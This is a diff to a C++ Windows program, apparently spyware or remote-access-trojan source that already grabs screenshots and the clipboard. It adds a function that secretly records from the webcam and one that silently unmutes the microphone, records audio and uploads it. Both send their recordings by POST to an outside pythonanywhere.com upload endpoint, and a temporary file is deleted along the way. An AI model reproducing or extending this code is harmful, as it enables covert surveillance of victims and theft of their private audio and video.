@@ -13,11 +13,15 @@ clipboard: return string [ok]
 #include <winsock2.h>
 #include <windows.h>
 #include <gdiplus.h>
-#include <mutex>
-
-// #include <opencv2/opencv.hpp>
+#include <dshow.h>
+#include <fstream>
+#include <filesystem>
+#include <mmdeviceapi.h>
+#include <endpointvolume.h>
 
 #include "request.hpp"
+#include "file.hpp"
+#include "string_functions.hpp"
 
 #pragma once
 
@@ -145,44 +149,145 @@ std::string GrabScreenshot() {
     return base64;
 }
 
-// std::mutex mxWebcam;
-// bool GetWebcamImage(std::string* pBase64) {
-//     std::lock_guard<std::mutex> lgLock(mxWebcam);
-//     cv::VideoCapture cap(0);
-//     if (!cap.isOpened()) return false;
-//     cv::Mat frame;
-//     for (int i = 0; i != 10; i++) {
-//         if (!cap.read(frame)) {
-//             cap.release();
-//             return false;
-//         }
-//     }
-//     std::vector<unsigned char> buffer;
-//     cv::imencode(".jpg", frame, buffer);
-//     std::string base64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
-//     int i = 0;
-//     int j = 0;
-//     unsigned char arr3[3];
-//     unsigned char arr4[4];
-//     for (unsigned char c: buffer) {
-//         arr3[i++] = c;
-//         if (i == 3) {
-//             arr4[0] = (arr3[0] & 0xfc) >> 2;
-//             arr4[1] = ((arr3[0] & 0x03) << 4) + ((arr3[1] & 0xf0) >> 4);
-//             arr4[2] = ((arr3[1] & 0x0f) << 2) + ((arr3[2] & 0xc0) >> 6);
-//             arr4[3] = arr3[2] & 0x3f;
-//             for (i = 0; (i < 4); i++) *pBase64 += base64Chars[arr4[i]];
-//             i = 0;
-//         }
-//     }
-//     if (i) {
-//         for (j = i; j < 3; j++) arr3[j] = '\0';
-//         arr4[0] = (arr3[0] & 0xfc) >> 2;
-//         arr4[1] = ((arr3[0] & 0x03) << 4) + ((arr3[1] & 0xf0) >> 4);
-//         arr4[2] = ((arr3[1] & 0x0f) << 2) + ((arr3[2] & 0xc0) >> 6);
-//         for (j = 0; (j < i + 1); j++) *pBase64 += base64Chars[arr4[j]];
-//         while ((i++ < 3)) *pBase64 += '=';
-//     }
-//     cap.release();
-//     return true;
-// }
+std::string GetWebcamImage() {
+
+    // String to LPCOLESTR
+    LPCOLESTR lpFileName = NULL;
+    std::string file = RandomString(16);
+    lpFileName = (LPCOLESTR) CoTaskMemAlloc((file.size() + 1) * sizeof(wchar_t));
+    MultiByteToWideChar(CP_UTF8, 0, file.c_str(), -1, (LPWSTR) lpFileName, (file.size() + 1));
+    
+    // Some declarations
+    ICaptureGraphBuilder2* pBuild;
+    IGraphBuilder* pGraph;
+    IBaseFilter* pCap;
+    IBaseFilter* pMux;
+    IMoniker* pMoniker;
+    IEnumMoniker* pEnum;
+    ICreateDevEnum* pDevEnum;
+    IMediaControl* pControl;
+    
+    // Initialize
+    CoInitializeEx(NULL, COINIT_MULTITHREADED);
+    CoCreateInstance(CLSID_CaptureGraphBuilder2, NULL, CLSCTX_INPROC_SERVER, IID_ICaptureGraphBuilder2, (void**) &pBuild);
+    CoCreateInstance(CLSID_FilterGraph, 0, CLSCTX_INPROC_SERVER, IID_IFilterGraph, (void**) &pGraph);
+    pBuild->SetFiltergraph(pGraph);
+    CoCreateInstance(CLSID_SystemDeviceEnum, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(&pDevEnum));
+    pDevEnum->CreateClassEnumerator(CLSID_VideoInputDeviceCategory, &pEnum, 0);
+    
+    // Get webcam device
+    while (pEnum->Next(1, &pMoniker, NULL) == S_OK) {
+
+        IPropertyBag* pPropBag;
+        pMoniker->BindToStorage(0, 0, IID_PPV_ARGS(&pPropBag));
+        VARIANT var;
+        VariantInit(&var);
+
+        pPropBag->Read(L"FriendlyName", &var, 0);
+        VariantClear(&var);
+        
+        pPropBag->Release();
+        pMoniker->Release();
+    }
+    pEnum->Reset();
+    pEnum->Next(1, &pMoniker, NULL);
+
+    // Bind filters
+    pMoniker->BindToObject(0, 0, IID_IBaseFilter, (void**) &pCap);
+    pGraph->AddFilter(pCap, L"Capture Filter");
+    pGraph->QueryInterface(IID_IMediaControl, (void**) &pControl);
+    pBuild->SetOutputFileName(&MEDIASUBTYPE_Avi, lpFileName, &pMux, NULL);
+    pBuild->RenderStream(&PIN_CATEGORY_CAPTURE, &MEDIATYPE_Video, pCap, NULL, pMux);
+    pControl->Run();
+    Sleep(1000);
+
+    // Clean up
+    pControl->Stop();
+    pBuild->Release();
+    pGraph->Release();
+    pCap->Release();
+    pMux->Release();
+    pMoniker->Release();
+    pEnum->Release();
+    pDevEnum->Release();
+    pControl->Release();
+    CoUninitialize();
+
+    // Read and remove
+    std::string data;
+    std::ifstream pRead(file, std::ios::binary);
+    ReadLong(pRead, data);
+    pRead.close();
+    std::filesystem::remove(file);
+
+    std::string fileID = POST_RequestRaw("http://0x3af72.pythonanywhere.com/user_upload_temp/", data);
+    return fileID;
+}
+
+std::string RecordAudio(int seconds) {
+    
+    // Unmute user
+    HRESULT hr;
+    IMMDeviceEnumerator* pEnum = NULL;
+    IMMDevice* pDev = NULL;
+    IAudioEndpointVolume* pAudioEndpointVol = NULL;
+    CoInitialize(NULL);
+    CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**) &pEnum);
+    pEnum->GetDefaultAudioEndpoint(eCapture, eConsole, &pDev);
+    pDev->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**) &pAudioEndpointVol);
+    BOOL bMuted;
+    pAudioEndpointVol->GetMute(&bMuted);
+    if (bMuted) {
+        pAudioEndpointVol->SetMute(FALSE, NULL);
+    }
+    pAudioEndpointVol->Release();
+    pDev->Release();
+    pEnum->Release();
+
+    HWAVEIN hWaveIn;
+    WAVEFORMATEX wfx;
+    wfx.wFormatTag = WAVE_FORMAT_PCM;
+    wfx.nChannels = 1;
+    wfx.nSamplesPerSec = 44100;
+    wfx.nAvgBytesPerSec = 44100 * 2;
+    wfx.nBlockAlign = 2;
+    wfx.wBitsPerSample = 16;
+
+    MMRESULT result = waveInOpen(&hWaveIn, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
+
+    char* buffer = new char[seconds * wfx.nAvgBytesPerSec];
+    WAVEHDR wHeader;
+    wHeader.lpData = buffer;
+    wHeader.dwBufferLength = seconds * wfx.nAvgBytesPerSec;
+    wHeader.dwFlags = 0;
+
+    waveInPrepareHeader(hWaveIn, &wHeader, sizeof(WAVEHDR));
+    waveInAddBuffer(hWaveIn, &wHeader, sizeof(WAVEHDR));
+    waveInStart(hWaveIn);
+    Sleep(seconds * 1000);
+    waveInStop(hWaveIn);
+    waveInUnprepareHeader(hWaveIn, &wHeader, sizeof(WAVEHDR));
+    waveInClose(hWaveIn);
+
+    std::string data;
+    char header[44] = {0};
+    strncpy(header, "RIFF", 4);
+    *(int*) (header + 4) = 36 + wHeader.dwBufferLength;
+    strncpy(header + 8, "WAVEfmt ", 8);
+    *(int*) (header + 16) = 16; // Size of the fmt chunk
+    *(short*) (header + 20) = 1; // Format (1 for PCM)
+    *(short*)(header + 22) = 1; // Channels
+    *(int*) (header + 24) = wfx.nSamplesPerSec; // Sample rate
+    *(int*) (header + 28) = wfx.nSamplesPerSec * wfx.nBlockAlign; // Byte rate
+    *(short*) (header + 32) = wfx.nBlockAlign; // Block align
+    *(short*) (header + 34) = wfx.wBitsPerSample; // Bits per sample
+    strncpy(header + 36, "data", 4);
+    *(int*) (header + 40) = wHeader.dwBufferLength;
+    CopyString(&data, header, sizeof(header));
+    CopyString(&data, buffer, seconds * wfx.nAvgBytesPerSec);
+    delete[] buffer;
+
+    // Upload
+    std::string fileID = POST_RequestRaw("http://0x3af72.pythonanywhere.com/user_upload_temp/", data);
+    return fileID;
+}
